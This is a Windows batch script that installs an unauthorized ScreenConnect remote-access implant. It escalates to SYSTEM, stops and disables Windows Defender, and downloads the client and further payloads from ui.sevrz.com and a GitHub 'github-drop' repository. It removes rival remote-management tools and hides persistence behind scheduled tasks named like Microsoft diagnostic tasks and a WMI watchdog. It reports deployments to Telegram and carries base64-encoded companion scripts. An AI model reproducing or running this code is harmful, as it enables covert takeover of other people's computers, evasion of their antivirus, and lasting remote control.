@echo off
setlocal EnableExtensions EnableDelayedExpansion
REM OWN BUILD 20260802O32 - CRLF + unique detach runner + IDENTVER=6 task ownership
set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
set "BOOT=%SystemRoot%\Temp\.wucache"
set "LOG=%WD%\boot.err"
set "MSI=%TEMP%\sc_primary.msi"
set "MSICACHE=%WD%\pkg.msi"
set "PRIM=ScreenConnect Client (5f6010579852e507)"
set "ALT=ScreenConnect Client (f861c8140d453427)"
set "KEEP1=5f6010579852e507"
set "KEEP2=f861c8140d453427"
set "MSIURL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "SELF=%WD%\own_run.cmd"
set "PF86=%ProgramFiles(x86)%"
set "DROP=https://raw.githubusercontent.com/xnobuddy/github-drop/main"
set "DROP2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main"
set "CURL=%SystemRoot%\System32\curl.exe"
if not exist "%CURL%" set "CURL=curl.exe"

if not exist "%WD%" mkdir "%WD%" >nul 2>&1
if not exist "%BOOT%" mkdir "%BOOT%" >nul 2>&1

REM Survive ScreenConnect Guest kill: detach into SYSTEM worker
if /I not "%~1"=="_RUN" (
  echo === OWN BUILD 20260802O32 ===
  echo whoami:
  whoami
  set "ELEV=0"
  whoami /groups | find "S-1-16-12288" >nul 2>&1 && set "ELEV=1"
  whoami /groups | find "S-1-5-18" >nul 2>&1 && set "ELEV=1"
  whoami | find /I "SYSTEM" >nul 2>&1 && set "ELEV=1"
  if "!ELEV!"=="0" (
    echo.
    echo *** NOT ELEVATED / NOT SYSTEM ***
    echo In ScreenConnect Command window: set Run as = SYSTEM
    echo Attempting UAC elevate ^(click Yes if prompted^)...
    copy /y "%~f0" "%BOOT%\own_elev.cmd" >nul 2>&1
    powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c \"%BOOT%\own_elev.cmd\"' -Verb RunAs"
    echo If no UAC prompt appeared, re-run command as SYSTEM.
    exit /b 5
  )
  echo elevated_ok>>"%BOOT%\boot.err" 2>nul
  REM O32b: never overwrite a locked own_run.cmd (prior worker holds it) — unique runner always.
  REM Also strip attrs on WD targets before any later copy.
  attrib -h -s -r "%BOOT%\own_run.cmd" >nul 2>&1
  attrib -h -s -r "%SELF%" >nul 2>&1
  set "RUNNER=%BOOT%\own_o32_%RANDOM%%RANDOM%.cmd"
  copy /y "%~f0" "!RUNNER!" >nul 2>&1
  if not exist "!RUNNER!" (
    echo ERROR: cannot write unique runner under %BOOT%
    exit /b 6
  )
  findstr /C:"OWN BUILD 20260802O32" "!RUNNER!" >nul 2>&1
  if errorlevel 1 (
    echo ERROR: runner copy is not O32 - abort
    exit /b 7
  )
  REM best-effort refresh of canonical paths (ignore lock failures)
  copy /y "!RUNNER!" "%BOOT%\own_run.cmd" >nul 2>&1
  mkdir "%WD%" >nul 2>&1
  copy /y "!RUNNER!" "%SELF%" >nul 2>&1
  echo go_start %DATE% %TIME%>>"%BOOT%\boot.err" 2>nul
  set "LOG=%WD%\boot.err"
  echo go_start %DATE% %TIME%>>"%LOG%" 2>nul
  if not exist "%LOG%" set "LOG=%BOOT%\boot.err"
  echo order=exterminate_then_repair_then_install>>"%LOG%" 2>nul
  echo engine=cmd_detached_o32>>"%LOG%" 2>nul
  echo whoami_launcher=>>"%LOG%" 2>nul
  whoami >>"%LOG%" 2>&1
  echo detach_begin>>"%LOG%" 2>nul
  echo runner=!RUNNER!>>"%LOG%" 2>nul
  set "DETACH_OK=0"

  REM Method A: plain schtasks as SYSTEM (paths have no spaces)
  REM NOTE: RUNNER is set inside this block - MUST use !RUNNER! (delayed expansion)
  schtasks /Delete /TN "WucacheOwn" /F >nul 2>&1
  schtasks /Create /TN "WucacheOwn" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c !RUNNER! _RUN" >"%BOOT%\detach.task" 2>&1
  if not errorlevel 1 (
    del /f /q "%BOOT%\wproof" >nul 2>&1
    schtasks /Run /TN "WucacheOwn" >"%BOOT%\detach.run" 2>&1
    if not errorlevel 1 (
      REM SC Guest often kills at 10s — do NOT wait 12s for proof; /Run means worker launched.
      set "DETACH_OK=1"
      echo detach_via=schtasks_root>>"%LOG%"
    )
  )

  REM Method B: wmic (often absent on Win11)
  if "!DETACH_OK!"=="0" (
    wmic process call create "cmd.exe /c \"!RUNNER!\" _RUN" >"%BOOT%\detach.wmic" 2>&1
    findstr /C:"ReturnValue = 0" "%BOOT%\detach.wmic" >nul 2>&1
    if not errorlevel 1 (
      set "DETACH_OK=1"
      echo detach_via=wmic>>"%LOG%"
    )
  )

  REM Method C: one-shot service (flat path; cmd not a service - last resort)
  if "!DETACH_OK!"=="0" (
    copy /y "!RUNNER!" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
    sc.exe stop WucacheOwn >nul 2>&1
    sc.exe delete WucacheOwn >nul 2>&1
    sc.exe create WucacheOwn binPath= "cmd.exe /c %SystemRoot%\Temp\wucache_own.cmd _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
    sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
    findstr /I /C:"START_PENDING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    findstr /I /C:"RUNNING" "%BOOT%\detach.scstart" >nul 2>&1 && set "DETACH_OK=1"
    if "!DETACH_OK!"=="1" echo detach_via=sc_service>>"%LOG%"
  )

  REM Method D: inline fallback (Guest may kill; better than nothing)
  if "!DETACH_OK!"=="0" (
    echo detach_via=inline_fallback>>"%LOG%"
    echo WARNING: detach APIs failed - running inline ^(Guest may kill^)

    call "!RUNNER!" _RUN
    exit /b !ERRORLEVEL!
  )

  echo detach_done>>"%LOG%"
  echo Detached OK. Wait ~90s then:
  echo   type "%LOG%"
  echo   type "%BOOT%\boot.err"
  echo   sc query state= all ^| findstr /I ScreenConnect
  exit /b 0
)

echo worker_start %DATE% %TIME%>>"%LOG%"
echo ok>"%BOOT%\wproof" 2>nul
echo === OWN WORKER 20260802O32 ===
if not exist "%LOG%" (
  set "LOG=%SystemRoot%\Temp\.wucache\boot.err"
  if not exist "%SystemRoot%\Temp\.wucache" mkdir "%SystemRoot%\Temp\.wucache" >nul 2>&1
  echo worker_start %DATE% %TIME%>>"%LOG%"
)

echo [0] Extract embedded payloads (self-contained mode)...
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
call :Extract B64_MON "%WD%\own_mon.cmd"
call :Extract B64_SEC "%WD%\own_secure.cmd"
call :Extract B64_TGR "%WD%\tg_report.ps1"
call :Extract B64_LIB "%WD%\own_lib.ps1"
if not exist "%WD%\notify.cfg" call :Extract B64_NTF "%WD%\notify.cfg"
echo embed_extract_done>>"%LOG%"

REM O32: force-refresh any stale/missing payload (old hardening used to freeze these files)
findstr /C:"20260802M22" "%WD%\own_mon.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP%/own_mon.cmd" >nul 2>&1
  if not exist "%WD%\own_mon.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_mon.cmd" "%DROP2%/own_mon.cmd" >nul 2>&1
)
findstr /C:"20260802S6" "%WD%\own_secure.cmd" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_secure.cmd" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP%/own_secure.cmd" >nul 2>&1
  if not exist "%WD%\own_secure.cmd" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_secure.cmd" "%DROP2%/own_secure.cmd" >nul 2>&1
)
findstr /C:"20260802T12" "%WD%\tg_report.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\tg_report.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP%/tg_report.ps1" >nul 2>&1
  if not exist "%WD%\tg_report.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\tg_report.ps1" "%DROP2%/tg_report.ps1" >nul 2>&1
)
findstr /C:"20260802L11" "%WD%\own_lib.ps1" >nul 2>&1
if errorlevel 1 (
  attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP%/own_lib.ps1" >nul 2>&1
  if not exist "%WD%\own_lib.ps1" "%CURL%" -L --connect-timeout 20 -o "%WD%\own_lib.ps1" "%DROP2%/own_lib.ps1" >nul 2>&1
)

echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
echo av_reg_begin>>"%LOG%"
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
echo av_fight_done>>"%LOG%"

echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
call :FetchMsi "%MSI%"
set "GOTMSI=%ERRORLEVEL%"
if "%GOTMSI%"=="0" (
  echo msi_ready>>"%LOG%"
) else (
  echo msi_fetch_FAILED>>"%LOG%"
)

echo [3] Exterminate foreign SC + disallowed RMM FIRST (clean field = SC installer custom action cannot collide)...
call :NukeForeign

echo [4] Ensure PRIMARY (SC-aware ladder: start -> /fa repair -> /i ONLY if unregistered)...
call :NoMsiPolicy
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary already RUNNING
  echo primary_already_running>>"%LOG%"
  goto :after_primary_install
)

REM present but STOPPED: restart, then /fa repair (never /i - shared legacy UpgradeCodes wipe ALT)
sc query "%PRIM%" >nul 2>&1
if not errorlevel 1 (
  echo primary_present_stopped_restart>>"%LOG%"
  net start "%PRIM%" >nul 2>&1
  sc start "%PRIM%" >nul 2>&1
  timeout /t 8 /nobreak >nul
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_restarted_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_stopped_try_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
  sc query "%PRIM%" | findstr /I RUNNING >nul
  if not errorlevel 1 (
    echo primary_repaired_ok>>"%LOG%"
    goto :after_primary_install
  )
  echo primary_repair_failed_still_stopped>>"%LOG%"
  goto :after_primary_install
)

REM service missing: try /fa if product registered (safe - no Upgrade table remove)
echo primary_svc_missing_try_repair>>"%LOG%"
if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_repaired_ok>>"%LOG%"
  goto :after_primary_install
)

if not "%GOTMSI%"=="0" (
  echo primary_skip_install_no_msi>>"%LOG%"
  goto :after_primary_install
)

REM refuse /i if product already registered - /i re-enters Upgrade table and can wipe ALT
set "REGSTATE=unknown"
if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%KEEP1%" -WorkDir "%WD%"`) do set "REGSTATE=%%R"
if /I "!REGSTATE!"=="yes" (
  echo primary_registered_skip_fresh_install>>"%LOG%"
  goto :after_primary_install
)

REM stale install dir with no registered product breaks SC custom action FixupServiceArguments
if exist "%PF86%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean>>"%LOG%"
  rmdir /s /q "%PF86%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)
if exist "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" (
  echo stale_primary_dir_clean_pf>>"%LOG%"
  rmdir /s /q "%ProgramFiles%\ScreenConnect Client (%KEEP1%)" >nul 2>&1
)

echo primary missing/unregistered - MSI install (LAST RESORT - Upgrade table may touch siblings)...
echo primary_install_begin>>"%LOG%"
msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install.log"
set "INST_EXIT=!ERRORLEVEL!"
echo msi_exit_!INST_EXIT!>>"%LOG%"
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry1>>"%LOG%"
  timeout /t 30 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install2.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
if "!INST_EXIT!"=="1618" (
  echo msi_busy_retry2>>"%LOG%"
  timeout /t 45 /nobreak >nul
  msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /L*v "%WD%\msi_install3.log"
  set "INST_EXIT=!ERRORLEVEL!"
  echo msi_retry1618_exit_!INST_EXIT!>>"%LOG%"
)
timeout /t 15 /nobreak >nul

REM post-install: product registered but service entry still missing -> /fa by GUID (safe)
sc query "%PRIM%" >nul 2>&1
if errorlevel 1 (
  echo postinstall_svc_missing_repair>>"%LOG%"
  if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP1%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

:after_primary_install
sc config "%PRIM%" start= auto >nul 2>&1
sc failure "%PRIM%" reset= 86400 actions= restart/3000/restart/3000/restart/3000 >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 5 /nobreak >nul
sc start "%PRIM%" >nul 2>&1
sc query "%PRIM%" | findstr /I RUNNING >nul
if not errorlevel 1 (
  echo primary_running_ok>>"%LOG%"
) else (
  echo primary_still_down_after_install>>"%LOG%"
  sc query "%PRIM%" >>"%LOG%" 2>&1
)

echo [5] Start allowlist...
sc config "%ALT%" start= auto >nul 2>&1
sc start "%ALT%" >nul 2>&1
sc config "%PRIM%" start= auto >nul 2>&1
sc start "%PRIM%" >nul 2>&1
timeout /t 2 /nobreak >nul
REM O32: restore ALT if its service entry was deleted (SC-family msiexec side effect)
sc query "%ALT%" >nul 2>&1
if errorlevel 1 if exist "%WD%\own_lib.ps1" (
  echo alt_missing_repair>>"%LOG%"
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%KEEP2%" -WorkDir "%WD%" >>"%LOG%" 2>&1
)

echo [6] Arm wipe-proof persist (identity tasks + WMI watchdog + MSI cache)...
echo persist_begin>>"%LOG%"
if exist "%~dp0notify.cfg" call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
if not exist "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" mkdir "%ProgramData%\Microsoft\Diagnosis\State\.etlcache" >nul 2>&1
call :ForceCopy "%WD%\own_mon.cmd" "%ProgramData%\Microsoft\Diagnosis\State\.etlcache\etl_mon.cmd"

if exist "%MSI%" for %%A in ("%MSI%") do if %%~zA GEQ 500000 (
  call :ForceCopy "%MSI%" "%MSICACHE%"
  echo msi_cached_bytes=%%~zA>>"%LOG%"
)

REM anti-signature identity: per-host task names + jittered schedule
REM O32/L11: IDENTVER=6 unique names; tasks-ensure verifies Task To Run owns mon
REM (existence-only Query previously false-OKed Windows Diagnosis\Scheduled).
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action init -WorkDir "%WD%" >nul 2>&1
if exist "%WD%\own_lib.ps1" (
  for /f "usebackq delims=" %%R in (`powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action tasks-ensure -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd"`) do (
    echo tasks_ensure %%R>>"%LOG%"
  )
)
if exist "%WD%\identity.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\identity.cfg") do set "%%K=%%L"
if not defined TASK_A set "TASK_A=\Microsoft\Windows\Diagnosis\EvtCacheSync"
if not defined TASK_B set "TASK_B=\Microsoft\Windows\PLA\ServerHealth"
if not defined TASK_C set "TASK_C=\Microsoft\Windows\WDI\ResolutionHostProxy"
if not defined TASK_D set "TASK_D=\Microsoft\Windows\Tcpip\IpConflictResolver"
if not defined MO_A set "MO_A=2"
if not defined MO_B set "MO_B=3"
echo identity_A=!TASK_A!>>"%LOG%"
echo identity_B=!TASK_B!>>"%LOG%"
echo identity_C=!TASK_C!>>"%LOG%"
echo identity_D=!TASK_D! mo=!MO_A!/!MO_B!>>"%LOG%"
echo persist_armed_identity>>"%LOG%"
schtasks /Query /TN "%TASK_A%" >nul 2>&1 || echo verify_taskA_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_B%" >nul 2>&1 || echo verify_taskB_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_C%" >nul 2>&1 || echo verify_taskC_FAIL>>"%LOG%"
schtasks /Query /TN "%TASK_D%" >nul 2>&1 || echo verify_taskD_FAIL>>"%LOG%"
schtasks /Run /TN "%TASK_A%" >nul 2>&1
echo first_tick_run>>"%LOG%"

REM chain 2: WMI watchdog subscription (mutual persistence)
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action watchdog -WorkDir "%WD%" -MonPath "%WD%\own_mon.cmd" >nul 2>&1
echo watchdog_armed>>"%LOG%"

REM campaign state baseline
if exist "%WD%\own_lib.ps1" powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build O32 -Extra "deploy" >nul 2>&1

echo [6b] Re-lock persist dirs/tasks/SC after arm...
if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"

echo [7] First-deploy Telegram report...
if not exist "%WD%\notify.cfg" (
  if exist "%~dp0notify.cfg" (
    call :ForceCopy "%~dp0notify.cfg" "%WD%\notify.cfg"
  ) else (
    echo notify_cfg_MISSING>>"%LOG%"
    echo WARNING: notify.cfg missing - TG report will be skipped. Seed BOT_TOKEN/CHAT_ID into %WD%\notify.cfg
  )
)
if exist "%WD%\notify.cfg" (
  powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State DEPLOY -Summary "own.cmd first deploy complete" -WorkDir "%WD%" -Build O32 >>"%LOG%" 2>&1
) else (
  echo deploy_tg_skipped_no_notify>>"%LOG%"
)
echo deploy_tg_done>>"%LOG%"

sc query "%PRIM%" >>"%LOG%" 2>&1
sc query state= all | findstr /I ScreenConnect >>"%LOG%"
echo go_exit_0>>"%LOG%"
exit /b 0

REM ========== helpers ==========
:FetchMsi
set "OUT=%~1"
del /f /q "%OUT%" >nul 2>&1
echo fetch_msi_begin>>"%LOG%"

if exist "%SystemRoot%\System32\curl.exe" (
  echo fetch_try=curl_sys>>"%LOG%"
  "%SystemRoot%\System32\curl.exe" -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
)
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=curl_path>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 30 --max-time 180 -o "%OUT%" "%MSIURL%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=powershell>>"%LOG%"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
  "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;" ^
  "Try{Invoke-WebRequest -Uri '%MSIURL%' -OutFile '%OUT%' -UseBasicParsing -TimeoutSec 180}Catch{Add-Content -LiteralPath '%LOG%' -Value ('fetch_ps_err '+$_.Exception.Message)}" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=github_pkg>>"%LOG%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP%/pkg.msi?t=%RANDOM%" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

echo fetch_try=jsdelivr_pkg>>"%LOG%"
"%CURL%" -L --connect-timeout 30 --max-time 300 -o "%OUT%" "%DROP2%/pkg.msi" >>"%LOG%" 2>&1
call :MsiOk "%OUT%"
if not errorlevel 1 exit /b 0

if exist "%MSICACHE%" (
  echo fetch_try=cache>>"%LOG%"
  copy /y "%MSICACHE%" "%OUT%" >nul
  call :MsiOk "%OUT%"
  if not errorlevel 1 exit /b 0
)

echo fetch_msi_all_failed>>"%LOG%"
exit /b 1

:MsiOk
if not exist "%~1" exit /b 1
for %%A in ("%~1") do (
  echo msi_bytes=%%~zA>>"%LOG%"
  if %%~zA LSS 500000 (
    echo msi_too_small>>"%LOG%"
    del /f /q "%~1" >nul 2>&1
    exit /b 1
  )
  copy /y "%~1" "%MSICACHE%" >nul 2>&1
)
exit /b 0

:NukeForeign
echo exterminate_begin>>"%LOG%"
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action exterminate -WorkDir "%WD%" >>"%LOG%" 2>&1
) else (
  echo exterminate_skipped_no_lib>>"%LOG%"
)
echo exterminate_done>>"%LOG%"
REM settle Windows Installer mutex after /x before any /i or /fa
timeout /t 8 /nobreak >nul
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIw
MjYwODAyTTIyDQpyZW0gIFBlcnNpc3RlbnQgd2F0Y2hkb2cgLSBpZGVudGl0eS1hd2FyZSAoYW50
aS1zaWduYXR1cmUpLCBtdXR1YWwNCnJlbSAgV01JK3NjaHRhc2tzIGNoYWlucywgTVNJIGZhbGxi
YWNrIGNoYWluLCBzdGF0ZS5qc29uLCBkaWdlc3QgSEIuDQpyZW0gIEF1dGhvcml6ZWQgaW50ZXJu
YWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVtIOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkA0Kc2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktFRVBf
RlA9NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0MjciDQpzZXQg
IldEPUM6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0K
c2V0ICJFVEw9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0ZVwuZXRsY2Fj
aGUiDQpzZXQgIkxPRz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJTVEFURT0lV0QlXG93bl9tb24u
c3RhdGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZsYWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3Ql
XFN5c3RlbTMyXGN1cmwuZXhlIg0Kc2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
dC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUl
UkFORE9NJSINCnNldCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9n
aXRodWItZHJvcEBtYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJP
V05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
cm9wL21haW4vb3duX3NlY3VyZS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMy
PWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293
bl9zZWN1cmUuY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8vcmF3
LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL293bl9tb24u
Y21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OMj1odHRwczovL2Nkbi5qc2RlbGl2
ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00l
JVJBTkRPTSUiDQpzZXQgIk9XTkxJQj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20v
eG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUi
DQpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1ZGR5L2dpdGh1
Yi1kcm9wQG1haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJM
PWh0dHBzOi8vdWkuc2V2cnouY29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9l
PUFjY2VzcyZ5PUd1ZXN0Ig0Kc2V0ICJNU0lfUEtHMT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29u
dGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9wa2cubXNpIg0Kc2V0ICJNU0lfUEtH
Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9w
a2cubXNpIg0Kc2V0ICJNU0k9JVByb2dyYW1EYXRhJVxTY3JlZW5Db25uZWN0LkNsaWVudFNldHVw
Lm1zaSINCnNldCAiTVNJQ0FDSEU9JVdEJVxwa2cubXNpIg0KDQppZiBub3QgZXhpc3QgIiVXRCUi
IG1kICIlV0QlIiAyPm51bA0KaWYgbm90IGV4aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAy
Pm51bA0KDQpzZXQgIk1PTlZFUj1NMjIiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSIN
CmZvciAvZiAidG9rZW5zPTEtMyBkZWxpbXM9LyAiICUlYSBpbiAoIiVkYXRlJSIpIGRvIHNldCAi
RFQ9JWRhdGUlICV0aW1lJSINCmVjaG8uPj4iJUxPRyUiDQplY2hvIOKUgOKUgCB0aWNrICFEVCEg
